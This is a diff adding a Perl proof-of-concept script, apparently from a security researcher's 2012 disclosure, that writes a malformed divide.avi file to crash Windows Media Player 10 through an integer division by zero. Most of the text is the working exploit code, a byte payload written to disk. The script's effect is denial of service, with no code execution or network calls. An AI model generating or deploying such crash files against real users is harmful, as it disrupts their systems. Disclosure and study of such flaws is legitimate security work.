@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+
+# Souhail Hammou - Independant Security Researcher & Penetration Tester .
+# Facebook : www.facebook.com/dark.puzzle.sec
+# E-mail   : dark-puzzle@live.fr
+# Greetings to all moroccan researchers and white hats .
+
+# Title  : Windows Media Player 10 - .avi Integer Division By Zero Vulnerability
+# Author : Dark-Puzzle (Souhail Hammou)
+# Type   : DoS/PoC
+# Risk   : Medium
+# Vendor : Microsoft
+# Versions : 10 Other Version May Be Vulnerable .
+# Tested On : Windows XP SP2 .
+# Date : 13 October 2012
+# ---------------------------------------------------------- #
+# Vulnerability Details : 
+# Division By zero Vulnerability in Microsoft Windows Media Player Consists to divide the value of a register by Zero .
+# In this case it is the ECX register executing a command DIV ECX as well known.
+# This will cause an Integer division by Zero --> Exception Can't be Handled --> CRASH .
+# Tested Just On Version "10" Might be working on other Versions .
+
+# POC :
+
+
+my $m = "MThd";
+my $div =
+"\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\xff\xff\x00\xff\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x06\x00\x00\x00\x66\x66\x66\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00";
+
+
+open(myfile,'>divide.avi');
+print myfile $m.$div;
+close(myfile);
+print "Windows Media Player 10 - .avi Integer Division By Zero Vulnerability\n";
+print "\x44\x69\x73\x63\x6F\x76\x65\x72\x65\x64\x20\x26\x20\x50\x6F\x43\x20\x42\x79\x20\x44\x61\x72\x6B\x2D\x50\x75\x7A\x7A\x6C\x65\n";
+print "Creating File Please Wait\n";
+sleep 5;
